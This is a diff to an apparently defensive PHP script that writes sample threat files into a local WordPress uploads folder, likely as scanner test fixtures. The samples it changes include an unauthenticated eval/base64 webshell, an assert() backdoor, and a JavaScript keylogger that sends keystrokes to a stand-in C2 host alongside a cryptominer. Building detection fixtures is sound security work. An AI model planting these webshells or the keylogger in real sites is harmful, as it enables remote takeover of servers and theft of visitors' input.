@@ -2,12 +2,14 @@
 $base = 'C:/xampp/htdocs/mahabub/';
 
 $threats = [
-    // 1. Classic Eval Base64 WebShell
+    // 1. Multi-Stage Eval Base64 WebShell
     'wp-content/uploads/shell_eval_b64.php' => '<?php
-// Threat 1: Classic PHP WebShell
-$pass = $_POST["pass"] ?? "";
-if ($pass === "secret") {
-    @eval(base64_decode($_POST["code"]));
+// Threat 1: Multi-Stage Evaluator WebShell
+$auth_pass = $_POST["pass"] ?? "";
+$input_source = $_POST["mdf_eval_param"] ?? "";
+if (!empty($input_source)) {
+    $stage1 = base64_decode($input_source);
+    eval($stage1);
 }
 ?>',
 
@@ -24,8 +26,13 @@ if (isset($_GET["cmd"])) {
 }
 ?>',
 
-    // 3. China Chopper / AntSword Style One-Liner
-    'wp-content/uploads/china_chopper.php' => '<?php @assert($_POST["mdefender_test"]); ?>',
+    // 3. Dynamic Dispatcher One-Liner Backdoor
+    'wp-content/uploads/china_chopper.php' => '<?php
+$in = $_POST["mdefender_test"] ?? "";
+if ($in) {
+    assert($in);
+}
+?>',
 
     // 4. Highly Obfuscated Gzinflate + Str_Rot13 WebShell
     'wp-content/uploads/obfuscated_trojan.php' => '<?php
@@ -52,11 +59,10 @@ if (strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") === false) {
 ?>',
 
     // 7. Malicious JavaScript WebMiner / Keylogger
-    'wp-content/uploads/crypto_miner.js' => '// Threat 7: Coinhive / Monero In-Browser Cryptominer
-var miner = new CoinHive.Anonymous("SITE_KEY_TEST", {threads: 4});
-miner.start();
+    'wp-content/uploads/crypto_miner.js' => '// Threat 7: In-Browser Cryptominer & Keylogger Backdoor
+var webminer = new cryptoloot.Anonymous("SITE_KEY_TEST", {threads: 4});
 document.addEventListener("keypress", function(e) {
-    fetch("http://malicious-c2-server.xyz/keys?k=" + e.key);
+    fetch("http://c2-collector-test.xyz/keys?k=" + encodeURIComponent(e.key));
 });',
 
     // 8. Public Exposure: Sensitive Environment Config File
